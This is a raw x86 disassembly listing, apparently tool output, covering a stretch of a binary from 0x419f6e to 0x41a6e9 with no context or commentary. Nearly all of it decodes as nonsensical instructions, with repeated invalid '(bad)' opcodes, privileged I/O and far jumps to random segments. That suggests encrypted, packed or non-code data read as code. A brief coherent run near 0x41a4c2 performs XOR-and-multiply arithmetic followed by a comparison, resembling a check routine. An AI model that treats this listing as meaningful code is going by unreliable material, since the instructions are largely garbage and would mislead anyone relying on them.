  419f6e:	pop    edi
  419f6f:	mov    ecx,0x3b3c5259
  419f74:	and    al,0x7b
  419f76:	dec    edx
  419f77:	rcr    DWORD PTR [eax],1
  419f79:	rcl    DWORD PTR [esi-0x3f],1
  419f7c:	call   0x23ff:0x16c0375a
  419f83:	xchg   ecx,eax
  419f84:	push   ds
  419f85:	repnz ins BYTE PTR es:[edi],dx
  419f87:	xlat   BYTE PTR ds:[ebx]
  419f88:	mov    ah,0xb8
  419f8a:	or     esp,edx
  419f8c:	xchg   ebp,eax
  419f8d:	(bad)  
  419f8e:	push   ebp
  419f8f:	xchg   ebx,eax
  419f90:	mov    esi,0xf62f0f00
  419f95:	sub    BYTE PTR [esi],dl
  419f97:	int3   
  419f98:	mov    ds:0x5c209bb5,eax
  419f9d:	push   ss
  419f9e:	jmp    0xc7e22dbc
  419fa3:	retf   0xfe3e
  419fa6:	xor    BYTE PTR [edi],bl
  419fa8:	and    edx,DWORD PTR ds:0x6051c608
  419fae:	xchg   edx,esp
  419fb0:	lock mov cs,edx
  419fb3:	add    DWORD PTR [ebx],esi
  419fb5:	inc    ebx
  419fb6:	mov    al,ds:0xe5ce816d
  419fbb:	or     eax,0x8a3ae59b
  419fc0:	nop
  419fc1:	test   al,0x88
  419fc3:	cmp    al,0x5b
  419fc5:	(bad)  
  419fc6:	dec    edx
  419fc7:	fild   DWORD PTR ds:0x915e42c9
  419fcd:	enter  0x64e5,0xe5
  419fd1:	in     al,0x5b
  419fd3:	jno    0x41a042
  419fd5:	mov    esi,0x61dfeffd
  419fda:	cmp    ebp,DWORD PTR [ecx]
  419fdc:	into   
  419fdd:	fs call 0x286d:0xa79f367d
  419fe5:	xchg   edi,eax
  419fe6:	mov    esp,edx
  419fe8:	add    al,0x1c
  419fea:	sti    
  419feb:	(bad)  
  419fec:	in     al,dx
  419fed:	jnp    0x41a047
  419fef:	arpl   si,sp
  419ff1:	jne    0x419f9e
  419ff3:	mov    al,ds:0x3c7da036
  419ff8:	adc    al,0x28
  419ffa:	jbe    0x419f91
  419ffc:	dec    ebp
  419ffd:	outs   dx,BYTE PTR ds:[esi]
  419ffe:	or     ecx,esi
  41a000:	ret    
  41a001:	ja     0x419fd2
  41a003:	shl    DWORD PTR [ecx-0x1a],0xff
  41a007:	(bad)  
  41a008:	fnstcw WORD PTR [esi]
  41a00a:	and    al,0xb1
  41a00c:	je     0x419fa8
  41a00e:	xor    DWORD PTR fs:[edx],0x9746be2
  41a015:	mov    ebx,0xba19d01e
  41a01a:	pushf  
  41a01b:	mov    eax,ds:0x5ddde4fa
  41a020:	js     0x41a036
  41a022:	mov    eax,ds:0xb665e407
  41a027:	scas   al,BYTE PTR es:[edi]
  41a028:	cmp    al,0x1a
  41a02a:	stos   BYTE PTR es:[edi],al
  41a02b:	jmp    0x41a088
  41a02d:	jno    0x41a0a7
  41a02f:	pop    ss
  41a030:	rol    BYTE PTR [edx],1
  41a032:	xchg   ebp,eax
  41a033:	xor    dh,BYTE PTR [edi]
  41a035:	ins    BYTE PTR es:[edi],dx
  41a036:	retf   0x842d
  41a039:	sbb    edi,esp
  41a03b:	loopne 0x419fc6
  41a03d:	imul   ebx,DWORD PTR [ecx+0x5909bda8],0xadb3ec4b
  41a047:	loop   0x41a09b
  41a049:	std    
  41a04a:	dec    ebp
  41a04b:	and    eax,0x9f81ccea
  41a050:	push   esi
  41a051:	aas    
  41a052:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a053:	jcxz   0x41a09e
  41a056:	in     eax,dx
  41a057:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a058:	push   ebx
  41a059:	loope  0x41a0b6
  41a05b:	jo     0x419ff4
  41a05d:	mov    BYTE PTR [esi+0x7254f906],bl
  41a063:	sbb    DWORD PTR [esi-0x44],ebp
  41a066:	es (bad) 
  41a068:	loop   0x41a03d
  41a06a:	push   cs
  41a06b:	stc    
  41a06c:	fld    QWORD PTR [ebp-0x65]
  41a06f:	mov    bl,0x8f
  41a071:	xor    eax,0x47a73f27
  41a076:	loope  0x41a0c1
  41a078:	xor    al,bl
  41a07a:	test   al,al
  41a07c:	cmp    ch,BYTE PTR [edx]
  41a07e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a07f:	add    al,0x6b
  41a081:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a082:	and    al,0x61
  41a084:	add    DWORD PTR ds:0x16ee3a9e,0x32357e21
  41a08e:	add    BYTE PTR [edx],ah
  41a090:	ins    DWORD PTR es:[edi],dx
  41a091:	pop    ecx
  41a092:	sub    DWORD PTR [eax+0x73],eax
  41a095:	ins    DWORD PTR es:[edi],dx
  41a096:	mov    ecx,0xd8d89cb
  41a09b:	stc    
  41a09c:	leave  
  41a09d:	(bad)  
  41a09e:	fisub  WORD PTR [edi]
  41a0a0:	inc    eax
  41a0a1:	sub    al,0x4
  41a0a3:	push   ebp
  41a0a4:	hlt    
  41a0a5:	add    eax,0x14208b0
  41a0aa:	bswap  ebx
  41a0ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a0ad:	in     eax,0xf5
  41a0af:	aas    
  41a0b0:	push   edi
  41a0b1:	inc    ebp
  41a0b2:	cmp    BYTE PTR [ebx],0x8e
  41a0b5:	add    BYTE PTR [eax-0x57823cdf],ah
  41a0bb:	js     0x41a04d
  41a0bd:	sbb    al,0x4b
  41a0bf:	repz xchg edx,eax
  41a0c1:	aas    
  41a0c2:	xchg   ecx,eax
  41a0c3:	jae    0x41a0a1
  41a0c5:	dec    eax
  41a0c6:	jns    0x41a0ef
  41a0c8:	shr    DWORD PTR ds:0x6df8e200,cl
  41a0ce:	enter  0x69ff,0xf2
  41a0d2:	(bad)  
  41a0d3:	lods   al,BYTE PTR ds:[esi]
  41a0d4:	jb     0x41a102
  41a0d6:	cmp    BYTE PTR [edx-0x7842f554],bl
  41a0dc:	push   edi
  41a0dd:	adc    al,0x12
  41a0df:	or     cl,BYTE PTR [edi-0x21e7652f]
  41a0e5:	adc    DWORD PTR [eax],edi
  41a0e7:	add    ch,ch
  41a0e9:	fiadd  WORD PTR [edi+0x7ef5ac74]
  41a0ef:	inc    edx
  41a0f0:	or     ah,ah
  41a0f2:	bound  ebx,QWORD PTR [esi]
  41a0f4:	and    ebx,DWORD PTR [edi]
  41a0f6:	inc    ebx
  41a0f7:	enter  0x369,0x51
  41a0fb:	out    dx,eax
  41a0fc:	push   esi
  41a0fd:	bound  eax,QWORD PTR [edx]
  41a0ff:	in     al,dx
  41a100:	ret    0x5b20
  41a103:	pop    ecx
  41a104:	sub    DWORD PTR [edx+0x129b0375],ebx
  41a10a:	mov    cl,0x5b
  41a10c:	pop    esp
  41a10d:	int    0xc3
  41a10f:	cmp    BYTE PTR [ebx],0x5e
  41a112:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a113:	mov    ah,0x80
  41a115:	gs dec ebp
  41a117:	popf   
  41a118:	mov    ds:0xdcae59b,eax
  41a11d:	aad    0x63
  41a11f:	mov    eax,0xdc291022
  41a124:	outs   dx,DWORD PTR gs:[esi]
  41a126:	das    
  41a127:	sub    BYTE PTR [esi-0x56],al
  41a12a:	popf   
  41a12b:	pop    ebx
  41a12c:	pop    ds
  41a12d:	sahf   
  41a12e:	adc    DWORD PTR [ecx-0x6c],esi
  41a131:	enter  0x33ee,0x7c
  41a135:	jmp    0x41a19a
  41a137:	pop    eax
  41a138:	mov    eax,0x6c4d4d3f
  41a13d:	and    esi,ebp
  41a13f:	jbe    0x41a162
  41a141:	or     al,0xc0
  41a143:	dec    ebx
  41a144:	inc    ebx
  41a145:	fcom   st(4)
  41a147:	data16 fisub WORD PTR ds:0xd8786eb5
  41a14e:	(bad)
  41a152:	ins    DWORD PTR es:[edi],dx
  41a153:	in     al,0xd9
  41a155:	sub    al,0xc5
  41a157:	mov    ah,dh
  41a159:	mov    edi,0x2a87317b
  41a15e:	and    ah,BYTE PTR [ebp-0x328540f2]
  41a164:	rol    al,1
  41a166:	inc    esp
  41a167:	mov    bh,BYTE PTR [edi+0x237bdd5f]
  41a16d:	xor    BYTE PTR [eax+0x5a],bl
  41a170:	stos   DWORD PTR es:[edi],eax
  41a171:	and    al,0x20
  41a173:	inc    ecx
  41a174:	mov    esi,0x5ccde1a5
  41a179:	in     eax,dx
  41a17a:	ds pusha 
  41a17c:	rcl    BYTE PTR [edi+0x756d7edb],1
  41a182:	cmp    dl,BYTE PTR fs:[ebx-0xf]
  41a186:	aaa    
  41a187:	fdiv   DWORD PTR [esp+ebx*4-0x30]
  41a18b:	mov    DWORD PTR [edx],esp
  41a18d:	jmp    0x54d8:0x2efc8ad0
  41a194:	arpl   WORD PTR [eax],dx
  41a196:	jnp    0x41a183
  41a198:	sbb    DWORD PTR [ebp-0x33],esi
  41a19b:	ins    DWORD PTR es:[edi],dx
  41a19c:	out    0xa6,al
  41a19e:	lods   eax,DWORD PTR ds:[esi]
  41a19f:	aaa    
  41a1a0:	lahf   
  41a1a1:	dec    esi
  41a1a2:	push   ecx
  41a1a3:	out    dx,eax
  41a1a4:	enter  0xe3e9,0x26
  41a1a8:	repnz push es
  41a1aa:	lahf   
  41a1ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a1ac:	mov    tr2,esp
  41a1af:	stc    
  41a1b0:	daa    
  41a1b1:	push   0x75a3ca2c
  41a1b6:	xor    DWORD PTR [ecx-0x2d],edx
  41a1b9:	sahf   
  41a1ba:	pusha  
  41a1bb:	add    al,0xf7
  41a1bd:	out    0x47,eax
  41a1bf:	ret    
  41a1c0:	out    0xe6,al
  41a1c2:	mov    ebx,0xb1fba815
  41a1c7:	int    0x41
  41a1c9:	cwde   
  41a1ca:	rcl    DWORD PTR [esi+0x15],1
  41a1cd:	inc    ecx
  41a1ce:	test   DWORD PTR [esp+ebp*8+0x7b],esp
  41a1d2:	or     al,0x3c
  41a1d4:	in     eax,0x17
  41a1d6:	punpckldq mm4,DWORD PTR [ebx-0x172d561c]
  41a1dd:	repz out dx,eax
  41a1df:	scas   al,BYTE PTR es:[edi]
  41a1e0:	mov    edi,0xf75c91de
  41a1e5:	fs (bad) 
  41a1e8:	and    al,0xf6
  41a1ea:	(bad)  
  41a1eb:	leave  
  41a1ec:	jb     0x41a1e0
  41a1ee:	xor    bh,bh
  41a1f0:	shl    DWORD PTR [esi-0x74],1
  41a1f3:	jbe    0x41a1b2
  41a1f5:	call   0xed25d74
  41a1fa:	or     BYTE PTR [ebx+0x5],bl
  41a1fd:	inc    eax
  41a1fe:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  41a200:	shr    BYTE PTR [esi],cl
  41a202:	(bad)  
  41a203:	iret   
  41a204:	mov    ch,0xc2
  41a206:	bound  esp,QWORD PTR [edx-0x75f33e8e]
  41a20c:	clc    
  41a20d:	test   eax,0xb86d3880
  41a212:	out    dx,al
  41a213:	push   edx
  41a214:	hlt    
  41a215:	ds inc eax
  41a217:	sub    esp,DWORD PTR [eax+edx*2-0x77]
  41a21b:	jno    0x41a1ca
  41a21d:	and    al,0x62
  41a21f:	dec    esi
  41a220:	pusha  
  41a221:	fld    DWORD PTR [ebx+0x483e0514]
  41a227:	(bad)  
  41a228:	mov    ebx,DWORD PTR [esi-0x583bcd8]
  41a22e:	add    esp,DWORD PTR [ebx+0x1c]
  41a231:	and    al,BYTE PTR ds:0x53b31e93
  41a237:	pusha  
  41a238:	push   cs
  41a239:	imul   ecx,DWORD PTR [ecx-0xb492991],0x79e30adb
  41a243:	and    eax,0xe333e784
  41a248:	cld    
  41a249:	enter  0xa166,0xe5
  41a24d:	inc    esi
  41a24e:	dec    ebp
  41a24f:	and    al,0x96
  41a251:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a252:	inc    eax
  41a253:	mov    al,ds:0x80e613c3
  41a258:	loopne 0x41a208
  41a25a:	or     DWORD PTR [ebp+edx*1+0x1a],ebx
  41a25e:	lahf   
  41a25f:	xor    al,0xd1
  41a261:	and    eax,DWORD PTR [eax]
  41a263:	enter  0x71c6,0xfb
  41a267:	out    dx,eax
  41a268:	mov    ecx,0x6c6c1488
  41a26d:	inc    BYTE PTR [esi+eax*8]
  41a270:	cmp    al,0x43
  41a272:	std    
  41a273:	xchg   edi,eax
  41a274:	mov    esp,ecx
  41a276:	imul   edx,DWORD PTR [edi],0x45bdbc42
  41a27c:	shl    DWORD PTR [eax-0x2b],cl
  41a27f:	push   0x65a2ad1c
  41a284:	sahf   
  41a285:	ret    0x151a
  41a288:	rol    BYTE PTR [eax+0x3],cl
  41a28b:	aam    0xfd
  41a28d:	dec    ebx
  41a28e:	cwde   
  41a28f:	not    edi
  41a291:	xchg   ebp,eax
  41a292:	mov    eax,ds:0x21f3835c
  41a297:	fmul   QWORD PTR [eax+esi*1+0x472da012]
  41a29e:	iret   
  41a29f:	sbb    edi,esi
  41a2a1:	mov    bl,0x1d
  41a2a3:	jg     0x41a2ea
  41a2a5:	xchg   ecx,eax
  41a2a6:	add    al,0x42
  41a2a8:	fs scas al,BYTE PTR es:[edi]
  41a2aa:	add    eax,0x37e18cda
  41a2af:	jp     0x41a28e
  41a2b1:	dec    DWORD PTR [edi+0xb233bb3]
  41a2b7:	and    BYTE PTR [ecx],cl
  41a2b9:	loop   0x41a2ab
  41a2bb:	mov    esi,0x7017dbf5
  41a2c0:	rol    DWORD PTR [ecx+0x7d7dc771],cl
  41a2c6:	arpl   WORD PTR [edi+ebp*1+0x7e],sp
  41a2ca:	inc    edi
  41a2cb:	pop    ebp
  41a2cc:	xchg   edx,eax
  41a2cd:	pusha  
  41a2ce:	mov    ebx,0x1b25d76c
  41a2d3:	mov    esp,DWORD PTR [ecx+edi*2]
  41a2d6:	xor    ebp,ebp
  41a2d8:	popa   
  41a2d9:	cli    
  41a2da:	or     al,0x8d
  41a2dc:	and    al,0x6a
  41a2de:	inc    edi
  41a2df:	mov    esi,0xb276baf4
  41a2e4:	gs das 
  41a2e6:	xor    DWORD PTR [edx+0x266856aa],0x7104c5ed
  41a2f0:	mov    eax,ds:0xfe804e90
  41a2f5:	outs   dx,DWORD PTR ds:[esi]
  41a2f6:	lock stc 
  41a2f8:	add    al,0x5d
  41a2fa:	jge    0x41a369
  41a2fc:	fidiv  DWORD PTR [ebp-0x27e597da]
  41a302:	pop    ebp
  41a303:	or     eax,0x4edc5978
  41a308:	push   esp
  41a309:	cmp    edi,DWORD PTR [ebp+0xc8e3f35]
  41a30f:	push   ebx
  41a310:	jb     0x41a2c2
  41a312:	imul   ecx,DWORD PTR [eax],0xffffffea
  41a315:	pop    ebx
  41a316:	(bad)  
  41a317:	xlat   BYTE PTR ds:[ebx]
  41a318:	jmp    0x33c181b5
  41a31d:	stos   DWORD PTR es:[edi],eax
  41a31e:	add    al,0xac
  41a320:	jl     0x41a2ac
  41a322:	sbb    DWORD PTR ds:0x70b944df,edi
  41a328:	inc    ebp
  41a329:	mov    BYTE PTR [edx-0x2a511c1a],bh
  41a32f:	lods   eax,DWORD PTR ds:[esi]
  41a330:	dec    eax
  41a331:	mov    eax,ds:0x1a857c04
  41a336:	pop    ss
  41a337:	jl     0x41a2c4
  41a339:	add    DWORD PTR [edx+0x2f],ebp
  41a33c:	loop   0x41a304
  41a33e:	adc    ecx,esp
  41a340:	dec    ebx
  41a341:	pop    edx
  41a342:	or     BYTE PTR [ebp+0x6a],bh
  41a345:	add    DWORD PTR [edx+0x32b55591],0xe484f688
  41a34f:	mov    dh,0xef
  41a351:	dec    edi
  41a352:	or     ebp,DWORD PTR [esi-0x15]
  41a355:	arpl   WORD PTR [ebx-0x62ab0544],ax
  41a35b:	mov    dh,0x38
  41a35d:	cmc    
  41a35e:	test   eax,0x155d833e
  41a363:	ror    eax,1
  41a365:	(bad)  
  41a366:	cmp    BYTE PTR [eax+0x15],ah
  41a369:	in     eax,dx
  41a36a:	xchg   DWORD PTR ds:0x8b6ae371,ebx
  41a370:	scas   al,BYTE PTR es:[edi]
  41a371:	jb     0x41a3a9
  41a373:	jge    0x41a321
  41a375:	xor    al,0x24
  41a377:	and    eax,0xdf1d601d
  41a37c:	aam    0x72
  41a37e:	jle    0x41a310
  41a380:	xchg   BYTE PTR [eax+0x4b],bl
  41a383:	addr16 add al,0x31
  41a386:	jb     0x41a360
  41a388:	jae    0x41a383
  41a38a:	enter  0xf5d8,0xb3
  41a38e:	das    
  41a38f:	pop    edi
  41a390:	mov    dh,0xca
  41a392:	jmp    0xaaa0:0x6c89aab2
  41a399:	popa   
  41a39a:	fistp  WORD PTR [ebx]
  41a39c:	test   DWORD PTR [ecx],edx
  41a39e:	cld    
  41a39f:	std    
  41a3a0:	stc    
  41a3a1:	sub    esi,DWORD PTR [ebx+0x2f719e42]
  41a3a7:	or     DWORD PTR [esi-0x55],0x3db37131
  41a3ae:	jae    0x41a346
  41a3b0:	xor    ebp,esi
  41a3b2:	retf   
  41a3b3:	or     ah,BYTE PTR [esi]
  41a3b5:	dec    BYTE PTR ds:0xb05f8db1
  41a3bb:	outs   dx,DWORD PTR ds:[esi]
  41a3bc:	or     DWORD PTR [edx+eiz*1-0x2df2142b],eax
  41a3c3:	inc    ecx
  41a3c4:	loop   0x41a430
  41a3c6:	pop    ecx
  41a3c7:	scas   eax,DWORD PTR es:[edi]
  41a3c8:	jmp    0x5b31:0x4c71af43
  41a3cf:	jg     0x41a3f6
  41a3d1:	mov    eax,0x8da5df6f
  41a3d6:	fld    QWORD PTR ds:0x4802bde6
  41a3dc:	aad    0x9a
  41a3de:	mov    al,0x8b
  41a3e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a3e1:	lahf   
  41a3e2:	sbb    DWORD PTR [ebx-0x3350957a],0x64
  41a3e9:	pop    ebx
  41a3ea:	push   ss
  41a3eb:	dec    eax
  41a3ec:	nop    ebx
  41a3ef:	retf   
  41a3f0:	and    DWORD PTR [esi],0xffffffb4
  41a3f3:	adc    eax,0x3ed1d47f
  41a3f8:	cmp    eax,0x31f7ce1e
  41a3fd:	mov    eax,0xe047b6cc
  41a402:	or     dh,BYTE PTR [edi+0x2720f4b3]
  41a408:	retf   0xa22e
  41a40b:	add    eax,0xd9c1dad
  41a410:	psrlw  mm5,mm1
  41a413:	pop    ebp
  41a414:	mov    ah,0xb7
  41a416:	xchg   edi,eax
  41a417:	sbb    BYTE PTR [edi],bh
  41a419:	or     ecx,0xce9d0e5c
  41a41f:	mov    esp,DWORD PTR [edi+eax*8-0x5c]
  41a423:	adc    DWORD PTR [eax+0x468c8061],esi
  41a429:	jp     0x41a425
  41a42b:	aas    
  41a42c:	retf   
  41a42d:	push   eax
  41a42e:	adc    DWORD PTR [edi],esp
  41a430:	and    BYTE PTR [esi+0x4de310bd],ch
  41a436:	mov    ah,0x6d
  41a438:	pop    ecx
  41a439:	popa   
  41a43a:	push   edi
  41a43b:	fstp   DWORD PTR cs:[edx]
  41a43e:	call   0xb7e0e5e4
  41a443:	sbb    BYTE PTR [edi-0x2a8062c],ah
  41a449:	fcmovnb st,st(1)
  41a44b:	out    dx,eax
  41a44c:	adc    dh,dl
  41a44e:	in     eax,dx
  41a44f:	cmp    ebx,edi
  41a451:	popa   
  41a452:	retf   0x5947
  41a455:	dec    edx
  41a456:	xchg   ebx,eax
  41a457:	sub    ebx,DWORD PTR [ebx-0x1b]
  41a45a:	in     eax,dx
  41a45b:	mov    ebp,0xf19c4a94
  41a460:	mov    bh,BYTE PTR [esi+0x71]
  41a463:	jle    0x41a49c
  41a465:	in     eax,0xc2
  41a467:	pop    ebp
  41a468:	push   ds
  41a469:	mov    ecx,DWORD PTR [esi-0x719d4931]
  41a46f:	mov    esi,0x56ece6e6
  41a474:	(bad)  
  41a475:	or     ebp,DWORD PTR [edx+edx*8+0xb60bbeb]
  41a47c:	cmp    DWORD PTR [ecx+0x3b],ecx
  41a47f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a480:	xor    al,0x19
  41a482:	xchg   ebx,eax
  41a483:	aas    
  41a484:	leave  
  41a485:	imul   DWORD PTR [ebx]
  41a487:	mov    ch,0xa9
  41a489:	daa    
  41a48a:	popa   
  41a48b:	adc    esp,eax
  41a48d:	pop    es
  41a48e:	inc    edi
  41a48f:	scas   al,BYTE PTR es:[edi]
  41a490:	dec    edi
  41a491:	jle    0x41a44d
  41a493:	jbe    0x41a4ae
  41a495:	loopne 0x41a434
  41a497:	mov    ebx,0xbe332188
  41a49c:	aam    0xb7
  41a49e:	or     al,0xd1
  41a4a0:	mov    eax,0xb629fadd
  41a4a5:	xchg   dl,ah
  41a4a7:	ffree  st(7)
  41a4a9:	push   ss
  41a4aa:	call   0x887e6e33
  41a4af:	bound  ebp,QWORD PTR [ebp+0x33472c8e]
  41a4b5:	repnz add eax,ecx
  41a4b8:	add    esi,ecx
  41a4ba:	imul   eax,esi
  41a4bd:	jmp    0x41c8af
  41a4c2:	mov    eax,DWORD PTR [ebp+0xc]
  41a4c5:	mov    eax,DWORD PTR [eax+0x78]
  41a4c8:	mov    DWORD PTR [ebp+0xc],eax
  41a4cb:	mov    eax,DWORD PTR [ebp-0x4]
  41a4ce:	mov    esi,DWORD PTR [ebp-0x8]
  41a4d1:	xor    eax,edx
  41a4d3:	xor    esi,edx
  41a4d5:	add    eax,ecx
  41a4d7:	add    esi,ecx
  41a4d9:	imul   eax,esi
  41a4dc:	mov    esi,DWORD PTR [ebp+0xc]
  41a4df:	cmp    esi,eax
  41a4e1:	mov    eax,DWORD PTR [ebp-0x4]
  41a4e4:	je     0x4180fd
  41a4ea:	xor    eax,edx
  41a4ec:	jmp    0x41c89e
  41a4f1:	aaa    
  41a4f2:	dec    eax
  41a4f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a4f4:	sbb    DWORD PTR [edi-0x67],esp
  41a4f7:	xchg   DWORD PTR [eax],ebp
  41a4f9:	and    bl,BYTE PTR [ecx+eiz*8-0x2740ac55]
  41a500:	xchg   ecx,eax
  41a501:	dec    eax
  41a502:	add    BYTE PTR [ecx+0x62],ah
  41a505:	int    0x5f
  41a507:	bound  esp,QWORD PTR [edx-0x19]
  41a50a:	and    al,dh
  41a50c:	jmp    0xcc5a:0xe303fba2
  41a513:	sahf   
  41a514:	mov    eax,0x1d924279
  41a519:	retf   0xc2ff
  41a51c:	adc    al,0x55
  41a51e:	or     DWORD PTR [eax],ebp
  41a520:	dec    ebx
  41a521:	jo     0x41a502
  41a523:	xlat   BYTE PTR ds:[ebx]
  41a524:	add    al,0x50
  41a526:	mov    eax,0xef9c4d6a
  41a52b:	ds dec edx
  41a52d:	push   0x54
  41a52f:	jno    0x41a51f
  41a531:	mov    bl,0x6e
  41a533:	mov    al,0x3e
  41a535:	in     eax,dx
  41a536:	xor    dl,BYTE PTR [ebx+ebp*8]
  41a539:	mov    ecx,0x6209a269
  41a53e:	popa   
  41a53f:	adc    al,0x46
  41a541:	popf   
  41a542:	(bad)  
  41a543:	ins    DWORD PTR es:[edi],dx
  41a544:	cmp    BYTE PTR [ebp-0x74a62d2a],al
  41a54a:	pop    edi
  41a54b:	add    al,0xcd
  41a54d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a54e:	xchg   esp,eax
  41a54f:	scas   eax,DWORD PTR es:[edi]
  41a550:	outs   dx,DWORD PTR ds:[esi]
  41a551:	cmc    
  41a552:	out    0x27,al
  41a554:	cmp    eax,0x2f481e8c
  41a559:	xor    eax,0x923734a
  41a55e:	mov    ebp,0xd878308d
  41a563:	(bad)  
  41a564:	scas   al,BYTE PTR es:[edi]
  41a565:	(bad)  [ebp+eax*4+0x50548615]
  41a56c:	inc    ebp
  41a56d:	mov    ds:0xc1549024,al
  41a572:	mov    dl,0xd1
  41a574:	sbb    eax,0x70beca56
  41a579:	jnp    0x41a5f5
  41a57b:	sub    eax,0x272426e7
  41a580:	jnp    0x41a5e5
  41a582:	xchg   BYTE PTR [eax-0x7c],dl
  41a585:	jl     0x41a55a
  41a587:	xchg   edx,eax
  41a588:	(bad)  
  41a589:	adc    DWORD PTR [esi],ecx
  41a58b:	lods   eax,DWORD PTR ds:[esi]
  41a58c:	cmp    ah,bl
  41a58e:	jecxz  0x41a54f
  41a590:	cld    
  41a591:	add    eax,0x840ba5cc
  41a596:	stc    
  41a597:	add    BYTE PTR [ebx-0x2974844b],ah
  41a59d:	dec    edi
  41a59e:	xchg   ebx,eax
  41a59f:	repz ss cmp al,0x85
  41a5a3:	rol    ebp,1
  41a5a5:	push   0x480d5c8c
  41a5aa:	jne    0x41a55f
  41a5ac:	stos   BYTE PTR es:[edi],al
  41a5ad:	lods   al,BYTE PTR fs:[esi]
  41a5af:	xor    DWORD PTR [edx],eax
  41a5b1:	and    BYTE PTR [edx+0x40d0818f],bh
  41a5b7:	fwait
  41a5b8:	mov    gs,WORD PTR [ecx+0x20]
  41a5bb:	rcl    DWORD PTR [ecx-0x69453cf4],cl
  41a5c1:	iret   
  41a5c2:	test   eax,0x1012757f
  41a5c7:	imul   esi,eax,0xffffffa6
  41a5ca:	sbb    ebp,DWORD PTR [ebx-0xd]
  41a5cd:	iret   
  41a5ce:	jno    0x41a5ed
  41a5d0:	sub    ah,bl
  41a5d2:	xchg   BYTE PTR [esp+ecx*1],bl
  41a5d5:	lahf   
  41a5d6:	add    cl,BYTE PTR [edi+esi*2]
  41a5d9:	inc    esp
  41a5da:	aam    0xf7
  41a5dc:	popf   
  41a5dd:	call   0xee10:0x6b5fb733
  41a5e4:	inc    esi
  41a5e5:	xchg   edi,edx
  41a5e7:	mul    DWORD PTR [eax+0x3f]
  41a5ea:	mov    dl,0xbf
  41a5ed:	in     eax,0x11
  41a5ef:	pushf  
  41a5f0:	sub    eax,0xeebaaa9b
  41a5f5:	xchg   ecx,edi
  41a5f7:	(bad)  
  41a5f8:	aam    0xe2
  41a5fa:	mov    bh,0x5e
  41a5fc:	test   eax,0xede5adcf
  41a601:	aad    0xe6
  41a603:	jp     0x41a5b1
  41a605:	jl     0x41a5f5
  41a607:	xchg   BYTE PTR [ecx-0x56f46898],dl
  41a60d:	ror    DWORD PTR [ecx-0x49],1
  41a610:	ss push esp
  41a612:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a613:	sbb    eax,0xfe208585
  41a618:	jne    0x41a65c
  41a61a:	scas   al,BYTE PTR es:[edi]
  41a61b:	cmp    eax,0x9427ac32
  41a620:	es popf 
  41a622:	xchg   edi,eax
  41a623:	(bad)  
  41a624:	jmp    0x41a661
  41a626:	adc    BYTE PTR [ebx-0x7308e9d4],al
  41a62c:	pop    edi
  41a62d:	sub    ecx,edi
  41a62f:	mov    al,0x27
  41a631:	fdivr  st,st(7)
  41a633:	std    
  41a634:	mov    ch,ah
  41a636:	mov    bh,0xa3
  41a638:	test   ebx,ecx
  41a63a:	fld    st(4)
  41a63c:	and    edx,DWORD PTR ds:0x654a30eb
  41a642:	or     dl,BYTE PTR [ebp+0x3b]
  41a645:	std    
  41a646:	cmp    BYTE PTR [esi+0x9],0x67
  41a64a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a64b:	fwait
  41a64c:	adc    eax,0x1bb2634a
  41a651:	mov    ah,0x66
  41a653:	lods   eax,DWORD PTR ds:[esi]
  41a654:	mov    BYTE PTR [ebp+0x5ccad2d3],al
  41a65a:	mov    edi,0xc3fcd91b
  41a65f:	mov    al,BYTE PTR [edi+eiz*4]
  41a662:	mov    cl,0x3e
  41a664:	dec    esi
  41a665:	lock adc ah,BYTE PTR [eax-0x47805981]
  41a66c:	scas   al,BYTE PTR es:[edi]
  41a66d:	inc    eax
  41a66e:	imul   BYTE PTR [ebp+0x1c]
  41a671:	lods   al,BYTE PTR ds:[esi]
  41a672:	pop    ss
  41a673:	ror    DWORD PTR [ecx-0x275eb0f6],1
  41a679:	xor    DWORD PTR [esi-0x373d29f],0x77
  41a680:	aaa    
  41a681:	cmp    al,0x77
  41a683:	inc    ebx
  41a684:	mov    esp,DWORD PTR [eax-0x135ca85e]
  41a68a:	mov    bh,0x8a
  41a68c:	or     edi,0x5ac731c1
  41a692:	sub    BYTE PTR ds:0x739a2a95,cl
  41a698:	lods   al,BYTE PTR ds:[esi]
  41a69a:	adc    ebp,DWORD PTR [edi+0x73]
  41a69d:	push   eax
  41a69e:	dec    edi
  41a69f:	test   DWORD PTR ss:[edx+0x5f],ebp
  41a6a3:	xor    DWORD PTR [ebx],esi
  41a6a5:	jne    0x41a699
  41a6a7:	cmc    
  41a6a8:	pusha  
  41a6a9:	inc    eax
  41a6aa:	stc    
  41a6ab:	mov    ah,0x3e
  41a6ad:	mov    cl,0xce
  41a6af:	pop    eax
  41a6b0:	scas   al,BYTE PTR es:[edi]
  41a6b1:	stc    
  41a6b2:	mov    dh,0x18
  41a6b4:	or     esi,esp
  41a6b6:	pop    edx
  41a6b7:	add    al,0xcf
  41a6b9:	adc    DWORD PTR [eax+0x68a92354],ecx
  41a6bf:	jae    0x41a6c3
  41a6c1:	pop    esi
  41a6c2:	call   0x66729301
  41a6c7:	gs jns 0x41a68b
  41a6ca:	mov    ebx,0x1d7fedba
  41a6cf:	(bad)  
  41a6d0:	jo     0x41a70f
  41a6d2:	pop    gs
  41a6d4:	add    edi,DWORD PTR [ebx-0x48]
  41a6d7:	or     al,0x95
  41a6d9:	sbb    cl,BYTE PTR [ecx]
  41a6db:	inc    ebp
  41a6dc:	push   ecx
  41a6dd:	ds mov ebp,0x8b358043
  41a6e3:	inc    ebx
  41a6e4:	mov    bl,0x6a
  41a6e6:	imul   ebp,DWORD PTR [edi],0xffffff81
  41a6e9:	fcomp  DWORD PTR [ecx+0x1c5d35fa]
